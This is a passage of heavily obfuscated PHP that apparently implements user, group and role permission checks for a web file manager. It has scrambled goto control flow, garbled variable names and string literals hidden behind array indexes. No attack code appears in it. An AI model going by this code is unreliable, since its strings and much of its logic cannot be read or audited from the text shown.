$e¹œˆÈâ¾ = array(); goto A‡ÅÕ”©™—; bÉôˆ™­·: if ($eäƒ¶å™) { $a‚ŞÄ³–Ã¬ = array(array($A½šÅ¥«ì[383] => SourceModel::TYPE_USER, $A½šÅ¥«ì[469] => $eê¢æë¸½¿), array($A½šÅ¥«ì[383] => SourceModel::TYPE_GROUP, $A½šÅ¥«ì[469] => array($A½šÅ¥«ì[396], $eäƒ¶å™)), $A½šÅ¥«ì[900] => $A½šÅ¥«ì[2180]); } if ($aÌÁİÍÌÃß) { $a‚ŞÄ³–Ã¬ = array($a‚ŞÄ³–Ã¬, $A½šÅ¥«ì[2239] => array($A½šÅ¥«ì[2278], $aÌÁİÍÌÃß)); } $cÒ¶ß¢Îòñ = $this->field($A½šÅ¥«ì[2279])->where($a‚ŞÄ³–Ã¬)->select(); goto FÚ½Ôƒº¢ƒ; F´ÃŸÀ†é¸: $A½šÅ¥«ì =& $_SERVER[¨¤¼…´]; static $cñ…á•²‘Ú = array(); $eê¢æë¸½¿ = $eê¢æë¸½¿ ? $eê¢æë¸½¿ : USER_ID; goto aŒõ®ˆ¦©­; aŒõ®ˆ¦©­: if (isset($cñ…á•²‘Ú[$eê¢æë¸½¿])) { return $cñ…á•²‘Ú[$eê¢æë¸½¿]; } $cÁÃÚÈ‹Ô‰ = Model($A½šÅ¥«ì[2277])->listData(); $aÌÁİÍÌÃß = array(); goto B¤·¢„Ø” ; b»—â¹«è: foreach ($B£ÀÎ‹Å¿™ as $e¿†¨›ºóù) { $cÏÓÏ¡–«± = $C‘ˆ²è¥™Â->getInfo($e¿†¨›ºóù); $dò£¦ŒéÕ = $dæ—ØïÖöğ->parentLevelArray($cÏÓÏ¡–«±[$A½šÅ¥«ì[472]]); $dñÎÒƒ£ç‘ = array_merge($dñÎÒƒ£ç‘, $dò£¦ŒéÕ); } $dñÎÒƒ£ç‘ = array_values(array_unique($dñÎÒƒ£ç‘)); foreach ($dñÎÒƒ£ç‘ as $e¿†¨›ºóù) { $cÏÓÏ¡–«± = $C‘ˆ²è¥™Â->getInfo($e¿†¨›ºóù); $dœ‰×‚§Í[] = $cÏÓÏ¡–«±[$A½šÅ¥«ì[403]][$A½šÅ¥«ì[381]]; $CŒÜ¶ªİŞ[$e¿†¨›ºóù] = $cÏÓÏ¡–«±[$A½šÅ¥«ì[403]][$A½šÅ¥«ì[381]]; $e¹œˆÈâ¾[$e¿†¨›ºóù] = $dæ—ØïÖöğ->parentLevelArray($cÏÓÏ¡–«±[$A½šÅ¥«ì[472]]); } goto e¯¦ÜÆÉ…¼; cèèˆœá‚–: } private function makeSourceAuth($aÉ½ÔÔêÕ, $dó†ÚÊ×íó, $f“’„öÇİ¨ = false) { goto DÏóµ·Ì‰ï; FÙÆ“Ó¸Â›: foreach ($Bë‰‚“ãå” as $dóàù¸î¡œ) { if (!isset($dó†ÚÊ×íó[$dóàù¸î¡œ])) { continue; } $BÜ¦ÛŠ¹Ÿ… = $this->authMake($dó†ÚÊ×íó[$dóàù¸î¡œ], $f“’„öÇİ¨); if ($BÜ¦ÛŠ¹Ÿ…[$c“†ßÂñ£–[430]]) { $A¨‡»¨¹º¾ = $BÜ¦ÛŠ¹Ÿ…; break; } } if (!$BÒ¨™‡Ó¾Á) { return $A¨‡»¨¹º¾; } if (!$A¨‡»¨¹º¾ && $B¦ÅçÍ‡Ûğ) { $A¨‡»¨¹º¾ = $this->groupAuthInfo($B¦ÅçÍ‡Ûğ, $B¹åÃ×—¤İ); } goto aÆ×Ùù­›; DÏóµ·Ì‰ï: $c“†ßÂñ£– =& $_SERVER[¨¤¼…´]; $DãŒˆÚùºŠ = $c“†ßÂñ£–[93]; $B¹åÃ×—¤İ = $aÉ½ÔÔêÕ[$c“†ßÂñ£–[469]]; goto a…Ü’ š“; aÆ×Ùù­›: if (!$A¨‡»¨¹º¾) { $CóŠ‡êƒ’¾ = Model($c“†ßÂñ£–[471])->getInfo($B¹åÃ×—¤İ); $D‰™É…ì¤ = explode($c“†ßÂñ£–[57], trim($CóŠ‡êƒ’¾[$c“†ßÂñ£–[472]], $c“†ßÂñ£–[57])); foreach ($D‰™É…ì¤ as $f­éŠç»ŞÖ) { if ($f­éŠç»ŞÖ == $c“†ßÂñ£–[481] || $f­éŠç»ŞÖ == $DãŒˆÚùºŠ) { continue; } $Dö¯Â§¶…ä = $this->groupRootAuth($f­éŠç»ŞÖ, $f“’„öÇİ¨); if (!$Dö¯Â§¶…ä) { continue; } $A¨‡»¨¹º¾ = $this->groupAuthInfo($Dö¯Â§¶…ä, $f­éŠç»ŞÖ); break; } } if (!$A¨‡»¨¹º¾ || $A¨‡»¨¹º¾[$c“†ßÂñ£–[389]] <= 0) { $eÁÁ½ÜŒ„ = $this->authDeepCheck($aÉ½ÔÔêÕ[$c“†ßÂñ£–[381]], $f“’„öÇİ¨); if ($eÁÁ½ÜŒ„) { $A¨‡»¨¹º¾ = $eÁÁ½ÜŒ„; } } return $A¨‡»¨¹º¾; goto d¹±ö”«¹Û; a…Ü’ š“: $BÒ¨™‡Ó¾Á = $aÉ½ÔÔêÕ[$c“†ßÂñ£–[383]] == SourceModel::TYPE_GROUP; $B¦ÅçÍ‡Ûğ = $BÒ¨™‡Ó¾Á ? $this->groupRootAuth($B¹åÃ×—¤İ, $f“’„öÇİ¨) : !1; if ($B¦ÅçÍ‡Ûğ && Model($c“†ßÂñ£–[2258])->authCheckAction($B¦ÅçÍ‡Ûğ[$c“†ßÂñ£–[388]], $c“†ßÂñ£–[1549])) { return $this->groupAuthInfo($B¦ÅçÍ‡Ûğ, $B¹åÃ×—¤İ); } goto c˜¤à›ğâ½; c˜¤à›ğâ½: $Bë‰‚“ãå” = Model($c“†ßÂñ£–[1107])->parentLevelArray($aÉ½ÔÔêÕ[$c“†ßÂñ£–[472]]); $Bë‰‚“ãå” = array_merge(array($aÉ½ÔÔêÕ[$c“†ßÂñ£–[381]]), array_reverse($Bë‰‚“ãå”)); $A¨‡»¨¹º¾ = !1; goto FÙÆ“Ó¸Â›; d¹±ö”«¹Û: } private function userIsRoot($Bƒ£»ìèº = false) { $F—åİÖ…Ì =& $_SERVER[¨¤¼…´]; if (!$Bƒ£»ìèº && _get($GLOBALS, $F—åİÖ…Ì[470])) { return !0; } $f£¸¥Ì§½é = Model($F—åİÖ…Ì[490])->getInfo($Bƒ£»ìèº); $a†´…’¬¦ = Model($F—åİÖ…Ì[2280])->listData($f£¸¥Ì§½é[$F—åİÖ…Ì[1310]]); if ($a†´…’¬¦ && $a†´…’¬¦[$F—åİÖ…Ì[1182]][$F—åİÖ…Ì[2281]] == 1) { return !0; } return !1; } private function sourceAuthInfo($e‡ß³°‹) { goto EÏ²ƒã²Óß; EÏ²ƒã²Óß: $E»Ç›¯à =& $_SERVER[¨¤¼…´]; $E¥¦Éé‹ã = Model($E»Ç›¯à[1107]); $f…¾Ø¾¦ = $E¥¦Éé‹ã->sourceInfo($e‡ß³°‹); goto cÂô‡ñ›‡¯; a¿ƒ‡Äº•: if (isset($f…¾Ø¾¦[$E»Ç›¯à[477]])) { $D˜™›ğ×†„ = explode($E»Ç›¯à[8], trim($f…¾Ø¾¦[$E»Ç›¯à[479]], $E»Ç›¯à[8])); array_shift($D˜™›ğ×†„); $B±¦™É‹ªø = $f…¾Ø¾¦[$E»Ç›¯à[475]] . $E»Ç›¯à[2282] . implode($E»Ç›¯à[8], $D˜™›ğ×†„); } return array($E»Ç›¯à[398] => $f…¾Ø¾¦[$E»Ç›¯à[38]], $E»Ç›¯à[85] => KodIO::make($f…¾Ø¾¦[$E»Ç›¯à[381]]), $E»Ç›¯à[2283] => $B±¦™É‹ªø); goto dÍŞ¡½Ñ²‹; c•Ì³´Á²Û: $BÑÁ¸Âé® = $E¥¦Éé‹ã->_listAppendPath($BÑÁ¸Âé®); $f…¾Ø¾¦ = $BÑÁ¸Âé®[0]; $B±¦™É‹ªø = $f…¾Ø¾¦[$E»Ç›¯à[479]]; goto a¿ƒ‡Äº•; cÂô‡ñ›‡¯: if (!$f…¾Ø¾¦) { return !1; } $E¥¦Éé‹ã->groupPathDisplay($f…¾Ø¾¦); $BÑÁ¸Âé® = array($f…¾Ø¾¦); goto c•Ì³´Á²Û; dÍŞ¡½Ñ²‹: } private function groupAuthInfo($fÄ˜®±œ, $C·åŞ˜Ù‘«) { $eÈ¥Ø´¡ÇÓ =& $_SERVER[¨¤¼…´]; $f×ë ¯ñ = Model($eÈ¥Ø´¡ÇÓ[471])->getInfo($C·åŞ˜Ù‘«); return array($eÈ¥Ø´¡ÇÓ[2284] => intval($fÄ˜®±œ[$eÈ¥Ø´¡ÇÓ[388]]), $eÈ¥Ø´¡ÇÓ[2267] => $fÄ˜®±œ, $eÈ¥Ø´¡ÇÓ[2285] => LNG($eÈ¥Ø´¡ÇÓ[2286]), $eÈ¥Ø´¡ÇÓ[2276] => array($eÈ¥Ø´¡ÇÓ[398] => $f×ë ¯ñ[$eÈ¥Ø´¡ÇÓ[38]], $eÈ¥Ø´¡ÇÓ[85] => KodIO::make($f×ë ¯ñ[$eÈ¥Ø´¡ÇÓ[403]][$eÈ¥Ø´¡ÇÓ[381]]), $eÈ¥Ø´¡ÇÓ[2283] => $f×ë ¯ñ[$eÈ¥Ø´¡ÇÓ[476]])); } protected function groupRootAuth($D¥ŒïĞîß, $cù‚ÇŒßÀ = false) { goto DóëÒˆ«Î±; DóëÒˆ«Î±: $cÑ‡ù„ì‚æ =& $_SERVER[¨¤¼…´]; $cù‚ÇŒßÀ = $cù‚ÇŒßÀ ? $cù‚ÇŒßÀ : USER_ID; $déš‘Åƒ”Û = $cù‚ÇŒßÀ . $cÑ‡ù„ì‚æ[2287] . $D¥ŒïĞîß; goto E›—Ñ¦¬ØĞ; DÀÂ³œ¯½Ç: return $e¹×ÌäéÉŞ[$déš‘Åƒ”Û]; goto dÒ ’Ùáâã; A†Œ¼ˆ…ËÑ: $A”ŠÛ§áá = array($cÑ‡ù„ì‚æ[381] => $cæ·¯†‡“[$cÑ‡ù„ì‚æ[403]][$cÑ‡ù„ì‚æ[381]]); $eÔ¬±ØÈªî = $cÑ‡ù„ì‚æ[2266]; $BÖÇùíîÕ½ = $this->field($eÔ¬±ØÈªî)->cacheMemory()->where($A”ŠÛ§áá)->select(); goto b¸¶…ÓªÅ‡; cËÚµ›ºÂ‡: $B´—†Ÿµ÷¿ = $this->userGroupList($cù‚ÇŒßÀ); $D¸©“ÁÜ = isset($B´—†Ÿµ÷¿[$D¥ŒïĞîß]) ? $B´—†Ÿµ÷¿[$D¥ŒïĞîß][$cÑ‡ù„ì‚æ[388]] : !1; if ($D¸©“ÁÜ && Model($cÑ‡ù„ì‚æ[2258])->authCheckAction($D¸©“ÁÜ[$cÑ‡ù„ì‚æ[388]], $cÑ‡ù„ì‚æ[1549])) { $e¹×ÌäéÉŞ[$déš‘Åƒ”Û] = $D¸©“ÁÜ; return $D¸©“ÁÜ; } goto A†Œ¼ˆ…ËÑ; E›—Ñ¦¬ØĞ: static $e¹×ÌäéÉŞ = array(); if (isset($e¹×ÌäéÉŞ[$déš‘Åƒ”Û])) { return $e¹×ÌäéÉŞ[$déš‘Åƒ”Û]; } $cæ·¯†‡“ = Model($cÑ‡ù„ì‚æ[471])->getInfo($D¥ŒïĞîß); goto cËÚµ›ºÂ‡; b¸¶…ÓªÅ‡: $D±ãÓ©Î—õ = $BÖÇùíîÕ½ ? $this->authMake($BÖÇùíîÕ½, $cù‚ÇŒßÀ) : !1; $aË™œ¹ÜĞ = $D±ãÓ©Î—õ ? $D±ãÓ©Î—õ[$cÑ‡ù„ì‚æ[430]] : !1; $e¹×ÌäéÉŞ[$déš‘Åƒ”Û] = $aË™œ¹ÜĞ ? $aË™œ¹ÜĞ : $D¸©“ÁÜ; goto DÀÂ³œ¯½Ç; dÒ ’Ùáâã: } public function authOwnerApply($e—Š×¯“) { goto cÔŸµ“ñæ‡; f—ÂßÉ‘ô–: $E´êˆ™©Î¸ = array(); $Eè¿éŸ”° = array(); foreach ($C±¹Ã‰‹‰Ä as $cñâóÓ¢¹µ => $E‡×Úå±ªŠ) { $eí’Ÿóç†â = $this->authFolderOwnerUser($E‡×Úå±ªŠ); $E´êˆ™©Î¸[$cñâóÓ¢¹µ] = $eí’Ÿóç†â; $Eè¿éŸ”° = array_merge($Eè¿éŸ”°, $eí’Ÿóç†â[$EÔïŸ¼”¥[547]]); if ($eí’Ÿóç†â[$EÔïŸ¼”¥[2289]]) { break; } } goto fñ¡–¯ãìÈ; E‡Ğù…Šº: $b§ĞŒ¦íˆ = array($EÔïŸ¼”¥[395] => array($EÔïŸ¼”¥[396], $b‡è¢ÜñÎ)); $C±¹Ã‰‹‰Ä = $this->field($f“‘…ìª³)->where($b§ĞŒ¦íˆ)->select(); $C±¹Ã‰‹‰Ä = array_to_keyvalue_group($C±¹Ã‰‹‰Ä, $EÔïŸ¼”¥[381]); goto f—ÂßÉ‘ô–; fñ¡–¯ãìÈ: if (count($Eè¿éŸ”°) == 0) { $Eè¿éŸ”° = $this->authFolderOwnerGroup($e—Š×¯“[$EÔïŸ¼”¥[469]]); } $Eè¿éŸ”° = array_unique($Eè¿éŸ”°); if (AuthModel::authCheckRoot($e—Š×¯“[$EÔïŸ¼”¥[388]][$EÔïŸ¼”¥[389]])) { $Eè¿éŸ”°[] = USER_ID; } goto c¥²×Õ¹É³; cÔŸµ“ñæ‡: $EÔïŸ¼”¥ =& $_SERVER[¨¤¼…´]; if (empty($e—Š×¯“[$EÔïŸ¼”¥[388]]) || isset($e—Š×¯“[$EÔïŸ¼”¥[2288]]) && $e—Š×¯“[$EÔïŸ¼”¥[2288]]) { return $e—Š×¯“; } if (AuthModel::authCheckRoot($e—Š×¯“[$EÔïŸ¼”¥[388]][$EÔïŸ¼”¥[389]])) { return $e—Š×¯“; } goto A»Â„ôÍÚ¨; A»Â„ôÍÚ¨: $b‡è¢ÜñÎ = Model($EÔïŸ¼”¥[1107])->parentLevelArray($e—Š×¯“[$EÔïŸ¼”¥[472]]); $b‡è¢ÜñÎ = array_merge(array($e—Š×¯“[$EÔïŸ¼”¥[381]]), array_reverse($b‡è¢ÜñÎ)); $f“‘…ìª³ = $EÔïŸ¼”¥[2266]; goto E‡Ğù…Šº; c¥²×Õ¹É³: $e—Š×¯“[$EÔïŸ¼”¥[388]][$EÔïŸ¼”¥[2290]] = Model($EÔïŸ¼”¥[487])->userListInfo($Eè¿éŸ”°); return $e—Š×¯“; goto EÈùºõ‹‚ö; EÈùºõ‹‚ö: } private function authFolderOwnerGroup($F ÓôÌ‰ø) { $dç¡âŒŒòÌ =& $_SERVER[¨¤¼…´]; $DÚ¢÷Éòò‚ = Model($dç¡âŒŒòÌ[2174])->where(array($dç¡âŒŒòÌ[2095] => $F ÓôÌ‰ø))->select(); $FÉ‰Ôß×Ç = array(); if (!$DÚ¢÷Éòò‚) { return $FÉ‰Ôß×Ç; } foreach ($DÚ¢÷Éòò‚ as $F‹ŸÒëÍ¡õ) { $EÜÑ“Ğ˜µì = $this->authInfo($F‹ŸÒëÍ¡õ); if (AuthModel::authCheckRoot($EÜÑ“Ğ˜µì[$dç¡âŒŒòÌ[388]])) { $FÉ‰Ôß×Ç[] = $F‹ŸÒëÍ¡õ[$dç¡âŒŒòÌ[1425]]; } } return $FÉ‰Ôß×Ç; } private function authFolderOwnerUser($eæÊ¹áŒ‘Ÿ) { $AóÎÜ–ïÇ =& $_SERVER[¨¤¼…´]; $CğÌ»„¸ˆÅ = array(); $fÒ—ªí† = !1; foreach ($eæÊ¹áŒ‘Ÿ as $F¦İáõ—Â) { $CÔéÒ×Ï¬ = $this->authInfo($F¦İáõ—Â); if ($F¦İáõ—Â[$AóÎÜ–ïÇ[469]] == $AóÎÜ–ïÇ[481]) { $fÒ—ªí† = !0; } if ($F¦İáõ—Â[$AóÎÜ–ïÇ[383]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($CÔéÒ×Ï¬[$AóÎÜ–ïÇ[388]])) { $CğÌ»„¸ˆÅ[] = $F¦İáõ—Â[$AóÎÜ–ïÇ[469]]; } } } return array($AóÎÜ–ïÇ[547] => $CğÌ»„¸ˆÅ, $AóÎÜ–ïÇ[2289] => $fÒ—ªí†); } public function authMake($aÀçö–Âêù, $DÌ÷‡ƒ³á¾ = false) { goto cİ†ÆœšÑÇ; cİ†ÆœšÑÇ: $D¥ÙÂá =& $_SERVER[¨¤¼…´]; if (!$aÀçö–Âêù) { return array($D¥ÙÂá[389] => 0, $D¥ÙÂá[430] => !1); } $DÌ÷‡ƒ³á¾ = $DÌ÷‡ƒ³á¾ ? $DÌ÷‡ƒ³á¾ : USER_ID; goto BàÉê–«…Ó; BàÉê–«…Ó: $Eâ¬öÍ¼ğÈ = 0; $fªè÷ïÛƒç = 0; $C“È§¦¯÷´ = 0; goto d˜Âö¬Ñ¸; d˜Âö¬Ñ¸: $eÏ’°Ò„ŠÊ = 0; $fôî½Ä¡šß = 0; $aòä‡ù¹„ = 0; goto A‚¼„¿æ’¯; eœîˆ¯çˆ: $aäÀÜ®ºŠ¨ = 0; $aŒÊÒÑÃ¬š = 0; $b®¡“ß÷ùÃ = array($D¥ÙÂá[381] => 0); goto bÀ¤É¦’òâ; dÑ–Ü¹õø½: return $Bù½‚¦Ø¸Ã; goto C•ŞØÒÒƒ; A‚¼„¿æ’¯: $Cö¯ÚÑÒêŠ = 1000; $Dª—²Ö„® = 0; $dÜ‘öƒÀ‹³ = 0; goto eœîˆ¯çˆ; bÀ¤É¦’òâ: foreach ($aÀçö–Âêù as $b®¡“ß÷ùÃ) { $CÕÇ¬´¤±¢ = $this->authInfo($b®¡“ß÷ùÃ); $b¥ö–«…¦… = $b®¡“ß÷ùÃ[$D¥ÙÂá[469]]; $eè…ÚÔÉ±Ş = intval($CÕÇ¬´¤±¢[$D¥ÙÂá[388]]); if ($b®¡“ß÷ùÃ[$D¥ÙÂá[383]] == SourceModel::TYPE_USER && $b¥ö–«…¦… == $DÌ÷‡ƒ³á¾) { $Eâ¬öÍ¼ğÈ = !0; $C“È§¦¯÷´ = $CÕÇ¬´¤±¢; $fªè÷ïÛƒç = $eè…ÚÔÉ±Ş; } else { if ($b®¡“ß÷ùÃ[$D¥ÙÂá[383]] == SourceModel::TYPE_GROUP && $this->groupContainUser($b¥ö–«…¦…, $DÌ÷‡ƒ³á¾)) { $eÏ’°Ò„ŠÊ = !0; $d–¢¸³ÇŞÃ = $this->groupStepToUserGroup($b¥ö–«…¦…, $DÌ÷‡ƒ³á¾); if ($d–¢¸³ÇŞÃ < $Cö¯ÚÑÒêŠ) { $Cö¯ÚÑÒêŠ = $d–¢¸³ÇŞÃ; $fôî½Ä¡šß = $eè…ÚÔÉ±Ş; $aòä‡ù¹„ = $CÕÇ¬´¤±¢; $Dª—²Ö„® = $b¥ö–«…¦…; } if ($d–¢¸³ÇŞÃ == $Cö¯ÚÑÒêŠ && $eè…ÚÔÉ±Ş >= $fôî½Ä¡šß) { $fôî½Ä¡šß = $eè…ÚÔÉ±Ş; $aòä‡ù¹„ = $CÕÇ¬´¤±¢; $Dª—²Ö„® = $b¥ö–«…¦…; } } else { if ($b¥ö–«…¦… == $D¥ÙÂá[481]) { $dÜ‘öƒÀ‹³ = !0; $aŒÊÒÑÃ¬š = $CÕÇ¬´¤±¢; $aäÀÜ®ºŠ¨ = $eè…ÚÔÉ±Ş; } } } } if ($Eâ¬öÍ¼ğÈ) { $eº´¢ÌÎÉÖ = $fªè÷ïÛƒç; $CÕÇ¬´¤±¢ = $C“È§¦¯÷´; $AÕèõËÆèù = LNG($D¥ÙÂá[2291]); } else { if ($eÏ’°Ò„ŠÊ) { $eº´¢ÌÎÉÖ = $fôî½Ä¡šß; $CÕÇ¬´¤±¢ = $aòä‡ù¹„; $E¿Ò¾êí÷í = Model($D¥ÙÂá[471])->getInfo($Dª—²Ö„®); $AÕèõËÆèù = $D¥ÙÂá[167] . $E¿Ò¾êí÷í[$D¥ÙÂá[476]] . $D¥ÙÂá[2292] . LNG($D¥ÙÂá[2293]); } else { if ($dÜ‘öƒÀ‹³) { $eº´¢ÌÎÉÖ = $aäÀÜ®ºŠ¨; $CÕÇ¬´¤±¢ = $aŒÊÒÑÃ¬š; $AÕèõËÆèù = LNG($D¥ÙÂá[2263]); } else { $eº´¢ÌÎÉÖ = 0; $CÕÇ¬´¤±¢ = !1; $AÕèõËÆèù = $D¥ÙÂá[43]; } } } $Bù½‚¦Ø¸Ã = array($D¥ÙÂá[2284] => intval($eº´¢ÌÎÉÖ), $D¥ÙÂá[2267] => $CÕÇ¬´¤±¢, $D¥ÙÂá[2285] => $AÕèõËÆèù, $D¥ÙÂá[2276] => $this->sourceAuthInfo($b®¡“ß÷ùÃ[$D¥ÙÂá[381]])); goto dÑ–Ü¹õø½; C•ŞØÒÒƒ: } private function groupContainUser($cáê›Ë¯‡‚, $eÙš™„‚ä = false) { return in_array($cáê›Ë¯‡‚, $this->userGroupParents($eÙš™„‚ä)); } private function groupStepToUserGroup($A‰²Á‘Ïª§, $fÏİ×„É = false) { goto CôÈ®Ùå¯ã; CôÈ®Ùå¯ã: $D¬¾Ë¬±­ =& $_SERVER[¨¤¼…´]; $D³Ü—Ç¢” = $this->userGroupList($fÏİ×„É); $B‘Â ™Î‘Õ = 1000; goto d”ÈßŠšå; d–•‚Ô¥ë: return $B‘Â ™Î‘Õ; goto Aá£ŠäÈÆ; d”ÈßŠšå: $A²„‘„ÓÎ³ = $GLOBALS[$D¬¾Ë¬±­[6]][$D¬¾Ë¬±­[94]][$D¬¾Ë¬±­[2186]] == 1; $aÔÏ±Ìˆ± = $A²„‘„ÓÎ³ ? 3 : 2; foreach ($D³Ü—Ç¢” as $fÒ‹¼©¨‘¢) { if ($fÒ‹¼©¨‘¢[$D¬¾Ë¬±­[2095]] == $A‰²Á‘Ïª§) { return 0; } $b§Æ’˜¢¯‰ = explode($D¬¾Ë¬±­[57], trim($fÒ‹¼©¨‘¢[$D¬¾Ë¬±­[472]], $D¬¾Ë¬±­[57])); if ($b§Æ’˜¢¯‰[0] == $D¬¾Ë¬±­[481] && count($b§Æ’˜¢¯‰) > $aÔÏ±Ìˆ±) { $Bæ­–’µÂ = array_reverse(array_slice($b§Æ’˜¢¯‰, $aÔÏ±Ìˆ±)); $F«Â«´ƒŸ‘ = array_search($A‰²Á‘Ïª§, $Bæ­–’µÂ); if ($F«Â«´ƒŸ‘ !== !1 && $F«Â«´ƒŸ‘ + 1 <= $B‘Â ™Î‘Õ) { $B‘Â ™Î‘Õ = $F«Â«´ƒŸ‘ + 1; } } } goto d–•‚Ô¥ë; Aá£ŠäÈÆ: } private function userGroupList($aÉ˜Œƒ„òƒ = false) { $bÑ‡Ù¬†İ =& $_SERVER[¨¤¼…´]; static $E‡¢¥Ó·– = array(); if (isset($E‡¢¥Ó·–[$aÉ˜Œƒ„òƒ])) { return $E‡¢¥Ó·–[$aÉ˜Œƒ„òƒ]; } $Fà†Œù»Õ¯ = Model($bÑ‡Ù¬†İ[490])->getInfo($aÉ˜Œƒ„òƒ); $E‡¢¥Ó·–[$aÉ˜Œƒ„òƒ] = array_to_keyvalue($Fà†Œù»Õ¯[$bÑ‡Ù¬†İ[2264]], $bÑ‡Ù¬†İ[2095]); return $E‡¢¥Ó·–[$aÉ˜Œƒ„òƒ]; } public function userGroupParents($e¢ĞÈîßõ…) { goto d”›Û¶­äİ; d”›Û¶­äİ: $Eè«Ó¸‰¹Ò =& $_SERVER[¨¤¼…´]; static $e†îƒ†‘Ä– = array(); $e¢ĞÈîßõ… = $e¢ĞÈîßõ… ? $e¢ĞÈîßõ… : USER_ID; goto Dß§Şƒ¦©º; Dß§Şƒ¦©º: if (isset($e†îƒ†‘Ä–[$e¢ĞÈîßõ…])) { return $e†îƒ†‘Ä–[$e¢ĞÈîßõ…]; } $BœİÈé¿‚ = $this->userGroupList($e¢ĞÈîßõ…); $D“Ÿ×ö¡ÔÓ = array(); goto CèìÃëÏ‡; eîĞ°æ›å£: $e†îƒ†‘Ä–[$e¢ĞÈîßõ…] = array_unique($D“Ÿ×ö¡ÔÓ); return $e†îƒ†‘Ä–[$e¢ĞÈîßõ…]; goto dÎÆëåË•Û; CèìÃëÏ‡: $cÈ¯ª‚´¯° = $GLOBALS[$Eè«Ó¸‰¹Ò[6]][$Eè«Ó¸‰¹Ò[94]][$Eè«Ó¸‰¹Ò[2186]] == 1; $Bá¾°ƒƒçİ = $cÈ¯ª‚´¯° ? 3 : 2; foreach ($BœİÈé¿‚ as $Aš©´îäİ) { $eÈ¨¬‘«¼æ = array($Aš©´îäİ[$Eè«Ó¸‰¹Ò[2095]]); $bÛöĞÏÒá› = explode($Eè«Ó¸‰¹Ò[57], trim($Aš©´îäİ[$Eè«Ó¸‰¹Ò[472]], $Eè«Ó¸‰¹Ò[57])); if ($bÛöĞÏÒá›[0] == $Eè«Ó¸‰¹Ò[481] && count($bÛöĞÏÒá›) > $Bá¾°ƒƒçİ) { $dù—ˆ® ùÛ = array_slice($bÛöĞÏÒá›, $Bá¾°ƒƒçİ); $eÈ¨¬‘«¼æ = array_merge($eÈ¨¬‘«¼æ, array_reverse($dù—ˆ® ùÛ)); } $D“Ÿ×ö¡ÔÓ = array_merge($D“Ÿ×ö¡ÔÓ, $eÈ¨¬‘«¼æ); } goto eîĞ°æ›å£; dÎÆëåË•Û: } public function authTargetInfoMake($e¦ÔĞ‡Åª) { goto D„ÉÄ¸ğ¦˜; D„ÉÄ¸ğ¦˜: $Bõ®ƒ’³ßƒ =& $_SERVER[¨¤¼…´]; $e§Ü¤ñ¶Õù = array(); $BÍÂ‰½Õª = array(); goto BºéŞ¡Áó—; BºéŞ¡Áó—: foreach ($e¦ÔĞ‡Åª as $b¼®íØÜÛ ) { if ($b¼®íØÜÛ [$Bõ®ƒ’³ßƒ[383]] == SourceModel::TYPE_USER) { $e§Ü¤ñ¶Õù[] = intval($b¼®íØÜÛ [$Bõ®ƒ’³ßƒ[469]]); } else { if ($b¼®íØÜÛ [$Bõ®ƒ’³ßƒ[383]] == SourceModel::TYPE_GROUP) { $BÍÂ‰½Õª[] = intval($b¼®íØÜÛ [$Bõ®ƒ’³ßƒ[469]]); } } } if ($e§Ü¤ñ¶Õù) { $e§Ü¤ñ¶Õù = Model($Bõ®ƒ’³ßƒ[487])->userListInfo($e§Ü¤ñ¶Õù); } if ($BÍÂ‰½Õª) { $e´È¨¯¢’† = array($Bõ®ƒ’³ßƒ[2172] => array($Bõ®ƒ’³ßƒ[396], $BÍÂ‰½Õª)); $BÍÂ‰½Õª = Model($Bõ®ƒ’³ßƒ[471])->field($Bõ®ƒ’³ßƒ[2185])->where($e´È¨¯¢’†)->select(); $BÍÂ‰½Õª = array_to_keyvalue($BÍÂ‰½Õª, $Bõ®ƒ’³ßƒ[2095]); } goto F‘˜ˆÚöÀ÷; F‘˜ˆÚöÀ÷: return array($Bõ®ƒ’³ßƒ[2294] => $e§Ü¤ñ¶Õù, $Bõ®ƒ’³ßƒ[2295] => $BÍÂ‰½Õª); goto e…ø’‰¶ºÍ; e…ø’‰¶ºÍ: } public function authInfo($Eä‹´Ó¡‡˜) { $CŞ¸ò·¼²î =& $_SERVER[¨¤¼…´]; if ($Eä‹´Ó¡‡˜[$CŞ¸ò·¼²î[2239]]) { $bÆ¶†«½½ = Model($CŞ¸ò·¼²î[2258])->listData($Eä‹´Ó¡‡˜[$CŞ¸ò·¼²î[2239]]); if (!$bÆ¶†«½½) { return !1; $b•õ¬ö¤’Ù = Model($CŞ¸ò·¼²î[2258])->listData(); $cİ‰³àŸÁ = array_filter_by_field($b•õ¬ö¤’Ù, $CŞ¸ò·¼²î[388], $CŞ¸ò·¼²î[481]); return $cİ‰³àŸÁ; } $eÔÌ‡¡·é± = array_field_key($bÆ¶†«½½, array($CŞ¸ò·¼²î[379], $CŞ¸ò·¼²î[38], $CŞ¸ò·¼²î[388], $CŞ¸ò·¼²î[2115], $CŞ¸ò·¼²î[2117])); $eÔÌ‡¡·é±[$CŞ¸ò·¼²î[2296]] = $Eä‹´Ó¡‡˜; return $eÔÌ‡¡·é±; } else { return array($CŞ¸ò·¼²î[397] => 0, $CŞ¸ò·¼²î[2101] => $Eä‹´Ó¡‡˜[$CŞ¸ò·¼²î[2240]], $CŞ¸ò·¼²î[398] => $CŞ¸ò·¼²î[43], $CŞ¸ò·¼²î[2115] => $CŞ¸ò·¼²î[2297]); } } } goto fÃÒ×´¿ËÌ; C—ÃñÉ—ÈŸ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\x6d\56\162\x6f\x6c\145\x4c\151\163\x74"; public $field = array("\x6e\x61\155\145", "\141\165\164\150", "\x6c\x61\142\x65\x6c", "\144\x69\163\160\154\x61\x79", "\x73\171\x73\x74\145\x6d", "\x64\145\x73\143", "\151\147\x6e\157\x72\x65\105\170\x74", "\151\x67\156\157\162\x65\106\151\154\x65\x53\x69\x7a\x65", "\141\x64\x6d\151\156\x69\x73\164\x72\x61\x74\x6f\x72", "\x73\x6f\x72\164"); public function listData($eèÕ˜­Åö = false, $fÚÃ©ËÊç = "\163\x6f\x72\164", $BïÃƒÏ¬© = false) { $cÉÕ³Í¦îÙ =& $_SERVER[¨¤¼…´]; $a¦õÔë¹½İ = parent::listData($eèÕ˜­Åö, $fÚÃ©ËÊç, $BïÃƒÏ¬©); if (!$eèÕ˜­Åö) { $Fñª¿ØÊôã = $cÉÕ³Í¦îÙ[2499]; foreach ($a¦õÔë¹½İ as $bæ‡§Í»Ô => $F„¥©‹é§ó) { if ($F„¥©‹é§ó[$cÉÕ³Í¦îÙ[2281]] == 1) { 